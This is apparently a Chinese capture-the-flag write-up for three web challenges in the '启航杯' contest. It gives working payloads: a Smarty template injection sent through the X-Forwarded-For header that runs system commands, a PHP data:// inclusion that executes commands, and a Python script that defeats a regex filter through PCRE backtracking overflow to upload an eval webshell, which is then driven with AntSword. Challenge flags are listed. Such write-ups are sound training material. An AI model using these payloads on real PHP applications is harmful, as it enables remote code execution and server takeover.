# 启航杯

----

### Web_IP

本题考察php的ssti，通过flag页面给的ip可知道注入点在xff上

* 尝试`{$smarty.version}`过后可以发现是由smarty渲染的
* 直接注入`{if system('ls /')}{/if}`
* 拿到flag：QHCTF{a4a897d2-0564-4b21-bfd5-20629695eea2}



 ### Easy_include

直接使用`data://text/plain,<?php system('ls /');`来执行命令

拿到flag：QHCTF{67ef1789-8f60-4075-92df-230eadf8b9f8}



###  PCREMagic

这是一题PHP正则回溯溢出绕过，is_php()函数对文件内容做了正则检测；关键点就是需要突破正则检测。

直接使用脚本

```python
import requests
from io import BytesIO
 
url = "http://2025.qihangcup.cn:32773/"
 
files = {
    'file': BytesIO(b'aaa<?php eval($_POST[1]);//' + b'a' * 1000000)
}
 
res = requests.post(url=url, files=files, allow_redirects=False)
 
print(res.headers)
```

通过返回的文件地址去连接蚁剑即可

flag：QHCTF{d658dea2-68db-44c1-a240-daa2717aec2b}